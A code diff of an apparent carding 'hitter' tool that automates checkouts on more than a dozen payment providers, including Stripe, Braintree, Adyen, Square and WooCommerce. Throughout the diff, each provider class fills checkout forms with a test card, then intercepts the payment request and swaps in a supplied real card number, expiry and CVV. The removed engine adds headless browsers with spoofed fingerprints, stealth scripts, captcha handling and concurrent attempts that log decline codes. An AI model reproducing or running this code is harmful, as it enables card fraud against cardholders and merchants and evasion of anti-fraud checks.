-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= BRAINTREE AUTOFILL =============
 class BraintreeAutofill(BaseAutofill):
@@ -1011,43 +863,37 @@ class BraintreeAutofill(BaseAutofill):
         'input[name="credit_card[number]"]', 'input[autocomplete="cc-number"]',
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
     ]
-    
     EXPIRY_SELECTORS = [
         'input[data-braintree-name="expiration_date"]', '#expiration-date',
         'input[name="credit_card[expiration_date]"]', 'input[placeholder*="MM/YY"]',
         'input[aria-label="Expiration date"]'
     ]
-    
     CVC_SELECTORS = [
         'input[data-braintree-name="cvv"]', '#cvv',
         'input[name="credit_card[cvv]"]', 'input[placeholder*="CVC"]',
         'input[aria-label="Security code"]'
     ]
-    
     NAME_SELECTORS = [
         'input[data-braintree-name="cardholder_name"]', '#cardholder-name',
         'input[name="credit_card[cardholder_name]"]', 'input[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         'input[type="email"]', '#email', 'input[name="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
         'button:has-text("Pay")', 'button:has-text("Submit")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("braintreegateway.com" in request.url or "braintree" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -1060,39 +906,9 @@ class BraintreeAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= ADYEN AUTOFILL =============
 class AdyenAutofill(BaseAutofill):
@@ -1101,42 +917,36 @@ class AdyenAutofill(BaseAutofill):
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
         '.card-number-input'
     ]
-    
     EXPIRY_SELECTORS = [
         '#expiryDate', 'input[name="expiryDate"]', '[data-cse="expiryMonth"]',
         'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
         '.expiry-date-input'
     ]
-    
     CVC_SELECTORS = [
         '#cvc', 'input[name="cvc"]', '[data-cse="cvc"]',
         'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
         '.cvc-input'
     ]
-    
     NAME_SELECTORS = [
         '#cardholderName', 'input[name="cardholderName"]', '[data-cse="holderName"]',
         'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         'input[type="email"]', '#email', 'input[name="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '.adyen-checkout__button', '[data-testid="pay-button"]',
         'button:has-text("Pay")', 'button:has-text("Submit")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("adyen.com" in request.url or "checkoutshopper" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -1151,39 +961,9 @@ class AdyenAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= SQUARE AUTOFILL =============
 class SquareAutofill(BaseAutofill):
@@ -1192,42 +972,36 @@ class SquareAutofill(BaseAutofill):
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
         '.sq-card-number'
     ]
-    
     EXPIRY_SELECTORS = [
         'input[name="expiration_date"]', '#expiration-date', '[autocomplete="cc-exp"]',
         'input[placeholder*="MM/YY"]', 'input[aria-label="Expiration date"]',
         '.sq-expiration-date'
     ]
-    
     CVC_SELECTORS = [
         'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
         'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
         '.sq-cvv'
     ]
-    
     NAME_SELECTORS = [
         'input[name="cardholder_name"]', '#cardholder-name', '[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         'input[type="email"]', '#email', 'input[name="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
         'button:has-text("Pay")', 'button:has-text("Submit")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("squareup.com" in request.url or "square" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -1241,39 +1015,9 @@ class SquareAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= MOLLIE AUTOFILL =============
 class MollieAutofill(BaseAutofill):
@@ -1282,42 +1026,36 @@ class MollieAutofill(BaseAutofill):
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
         '.card-number'
     ]
-    
     EXPIRY_SELECTORS = [
         'input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]',
         'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
         '.expiry-date'
     ]
-    
     CVC_SELECTORS = [
         'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
         'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
         '.cvc'
     ]
-    
     NAME_SELECTORS = [
         'input[name="cardholderName"]', '#cardholderName', '[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         'input[type="email"]', '#email', 'input[name="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
         'button:has-text("Pay")', 'button:has-text("Submit")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("mollie.com" in request.url or "api.mollie.com" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -1328,39 +1066,9 @@ class MollieAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= KLARNA AUTOFILL =============
 class KlarnaAutofill(BaseAutofill):
@@ -1368,40 +1076,34 @@ class KlarnaAutofill(BaseAutofill):
         'input[name="cardNumber"]', '#cardNumber', '[autocomplete="cc-number"]',
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
     ]
-    
     EXPIRY_SELECTORS = [
         'input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]',
         'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]'
     ]
-    
     CVC_SELECTORS = [
         'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
         'input[placeholder*="CVC"]', 'input[aria-label="Security code"]'
     ]
-    
     NAME_SELECTORS = [
         'input[name="cardholderName"]', '#cardholderName', '[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         'input[type="email"]', '#email', 'input[name="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
         'button:has-text("Pay")', 'button:has-text("Submit")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("klarna.com" in request.url or "api.klarna.com" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -1412,39 +1114,9 @@ class KlarnaAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= AUTHORIZE.NET AUTOFILL =============
 class AuthorizeNetAutofill(BaseAutofill):
@@ -1452,40 +1124,34 @@ class AuthorizeNetAutofill(BaseAutofill):
         'input[name="x_card_num"]', '#cardNumber', '[autocomplete="cc-number"]',
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
     ]
-    
     EXPIRY_SELECTORS = [
         'input[name="x_exp_date"]', '#expiryDate', '[autocomplete="cc-exp"]',
         'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]'
     ]
-    
     CVC_SELECTORS = [
         'input[name="x_card_code"]', '#cvv', '[autocomplete="cc-csc"]',
         'input[placeholder*="CVC"]', 'input[aria-label="Security code"]'
     ]
-    
     NAME_SELECTORS = [
         'input[name="x_card_name"]', '#cardholderName', '[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         'input[type="email"]', '#email', 'input[name="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
         'button:has-text("Pay")', 'button:has-text("Submit")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("authorize.net" in request.url or "authorizenet" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -1496,39 +1162,9 @@ class AuthorizeNetAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= WOOCOMMERCE AUTOFILL =============
 class WooCommerceAutofill(BaseAutofill):
@@ -1537,41 +1173,35 @@ class WooCommerceAutofill(BaseAutofill):
         'input[name="cardnumber"]', 'input[autocomplete="cc-number"]',
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
     ]
-    
     EXPIRY_SELECTORS = [
         '#wc-stripe-expiry', '#wc-braintree-expiry', 'input[name="expirydate"]',
         'input[autocomplete="cc-exp"]', 'input[placeholder*="MM/YY"]'
     ]
-    
     CVC_SELECTORS = [
         '#wc-stripe-cvc', '#wc-braintree-cvc', 'input[name="cvc"]',
         'input[autocomplete="cc-csc"]', 'input[placeholder*="CVC"]'
     ]
-    
     NAME_SELECTORS = [
         'input[name="cardholder_name"]', 'input[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         '#billing_email', 'input[name="billing_email"]', 'input[type="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '#place_order', '.place-order-button',
         'button:has-text("Place order")', 'button:has-text("Pay")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
-            if request.method == "POST" and ("woocommerce" in request.url or "wc-api" in request.url):
+
+        async def intercept_route(route, request):
+            if request.method == "POST" and ("woocommerce" in request.url or "wc-api" in request.url or "stripe.com" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
                     post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
@@ -1581,39 +1211,9 @@ class WooCommerceAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= BIGCOMMERCE AUTOFILL =============
 class BigCommerceAutofill(BaseAutofill):
@@ -1621,40 +1221,34 @@ class BigCommerceAutofill(BaseAutofill):
         '#card-number', 'input[name="card_number"]', '[autocomplete="cc-number"]',
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
     ]
-    
     EXPIRY_SELECTORS = [
         '#expiry-date', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
         'input[placeholder*="MM/YY"]'
     ]
-    
     CVC_SELECTORS = [
         '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
         'input[placeholder*="CVC"]'
     ]
-    
     NAME_SELECTORS = [
         '#cardholder-name', 'input[name="cardholder_name"]', '[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         '#email', 'input[name="email"]', 'input[type="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '#pay-button', '.pay-button',
         'button:has-text("Pay")', 'button:has-text("Place order")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("bigcommerce.com" in request.url or "bigcommerce" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -1665,39 +1259,9 @@ class BigCommerceAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= WIX AUTOFILL =============
 class WixAutofill(BaseAutofill):
@@ -1705,40 +1269,34 @@ class WixAutofill(BaseAutofill):
         '#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
     ]
-    
     EXPIRY_SELECTORS = [
         '#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
         'input[placeholder*="MM/YY"]'
     ]
-    
     CVC_SELECTORS = [
         '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
         'input[placeholder*="CVC"]'
     ]
-    
     NAME_SELECTORS = [
         '#cardholderName', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         '#email', 'input[name="email"]', 'input[type="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '.pay-button', '#pay-button',
         'button:has-text("Pay")', 'button:has-text("Place order")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("wix.com" in request.url or "wix" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -1749,39 +1307,9 @@ class WixAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
 
 # ============= ECWID AUTOFILL =============
 class EcwidAutofill(BaseAutofill):
@@ -1789,40 +1317,34 @@ class EcwidAutofill(BaseAutofill):
         '#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
         'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
     ]
-    
     EXPIRY_SELECTORS = [
         '#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
         'input[placeholder*="MM/YY"]'
     ]
-    
     CVC_SELECTORS = [
         '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
         'input[placeholder*="CVC"]'
     ]
-    
     NAME_SELECTORS = [
         '#cardholderName', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
         'input[placeholder*="Name on card"]'
     ]
-    
     EMAIL_SELECTORS = [
         '#email', 'input[name="email"]', 'input[type="email"]',
         'input[placeholder*="email"]'
     ]
-    
     SUBMIT_SELECTORS = [
         'button[type="submit"]', '.pay-button', '#pay-button',
         'button:has-text("Pay")', 'button:has-text("Place order")'
     ]
-    
     MASKED_CARD = "4242424242424242"
     MASKED_EXPIRY = "01/30"
     MASKED_CVV = "123"
-    
+
     async def enable_card_replace(self, real_card: Dict):
         self.real_card = real_card
-        
-        async def intercept_route(route: Route, request: Request):
+
+        async def intercept_route(route, request):
             if request.method == "POST" and ("ecwid.com" in request.url or "ecwid" in request.url):
                 post_data = request.post_data
                 if post_data and self.real_card:
@@ -1833,408 +1355,129 @@ class EcwidAutofill(BaseAutofill):
                     await route.continue_(post_data=post_data)
                     return
             await route.continue_()
-        
+
         await self.page.route("**/*", intercept_route)
-    
-    async def find_and_fill_field(self, selectors: List[str], value: str):
-        for sel in selectors:
-            try:
-                element = await self.page.query_selector(sel)
-                if element and await element.is_visible():
-                    await element.click()
-                    await element.fill(value)
-                    return True
-            except:
-                continue
-        return False
-    
-    async def fill_card(self, card: Dict):
-        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
-        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
-        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
-        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
-        email = f"dlx{random.randint(100,9999)}@example.com"
-        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)
-    
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SELECTORS:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except:
-                continue
-        return False
+
+
+# ============= AUTOFILL MAP =============
+AUTOFILL_MAP = {
+    'stripe': StripeAutofill,
+    'checkoutcom': CheckoutComAutofill,
+    'shopify': ShopifyAutofill,
+    'paypal': PayPalAutofill,
+    'braintree': BraintreeAutofill,
+    'adyen': AdyenAutofill,
+    'square': SquareAutofill,
+    'mollie': MollieAutofill,
+    'klarna': KlarnaAutofill,
+    'authorizenet': AuthorizeNetAutofill,
+    'woocommerce': WooCommerceAutofill,
+    'bigcommerce': BigCommerceAutofill,
+    'wix': WixAutofill,
+    'ecwid': EcwidAutofill,
+}
+
+SUPPORTED_PROVIDERS = list(AUTOFILL_MAP.keys())
+
 
 # ============= HITTER ENGINE =============
-class HitterEngine:
-    def __init__(self):
-        self.results = []
-        self.successes = 0
-        self.fails = 0
-        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT)
-        self.rate_limiter = SmartRateLimiter()
-    
-    async def hit(self, url: str, card: Dict, merchant: str, product: str, amount: str, attempt_num: int) -> Dict:
-        async with self.semaphore:
-            return await self._single_hit(url, card, merchant, product, amount, attempt_num)
-    
-    async def _single_hit(self, url: str, card: Dict, merchant: str, product: str, amount: str, attempt_num: int) -> Dict:
-        start_time = time.time()
-        result = {
-            'attempt': attempt_num,
-            'card': card,
-            'success': False,
-            'decline_code': None,
-            'receipt_url': None,
-            'response_time': 0
-        }
-        
-        try:
-            async with async_playwright() as p:
-                fingerprint = FingerprintGenerator.generate()
-                
-                browser = await p.chromium.launch(
-                    headless=True,
-                    args=['--disable-blink-features=AutomationControlled', '--no-sandbox']
-                )
-                
-                context_options = {
-                    'user_agent': fingerprint['user_agent'],
-                    'viewport': fingerprint['viewport'],
-                    'locale': fingerprint['locale'],
-                    'timezone_id': fingerprint['timezone_id'],
-                    'ignore_https_errors': True
-                }
-                
-                browser_context = await browser.new_context(**context_options)
-                page = await browser_context.new_page()
-                
-                await page.add_init_script(FingerprintGenerator.get_stealth_script())
-                await page.goto(url, timeout=60000, wait_until='domcontentloaded')
-                await asyncio.sleep(3)
-                
-                provider = detect_provider(url, await page.content())
-                
-                # Map provider to autofill class
-                autofill_map = {
-                    'stripe': StripeAutofill,
-                    'checkoutcom': CheckoutComAutofill,
-                    'shopify': ShopifyAutofill,
-                    'paypal': PayPalAutofill,
-                    'braintree': BraintreeAutofill,
-                    'adyen': AdyenAutofill,
-                    'square': SquareAutofill,
-                    'mollie': MollieAutofill,
-                    'klarna': KlarnaAutofill,
-                    'authorizenet': AuthorizeNetAutofill,
-                    'woocommerce': WooCommerceAutofill,
-                    'bigcommerce': BigCommerceAutofill,
-                    'wix': WixAutofill,
-                    'ecwid': EcwidAutofill
-                }
-                
-                autofill_class = autofill_map.get(provider)
-                if not autofill_class:
-                    result['error'] = f'Unsupported provider: {provider}'
-                    await browser.close()
-                    return result
-                
-                autofill = autofill_class(page)
-                await autofill.handle_captcha()
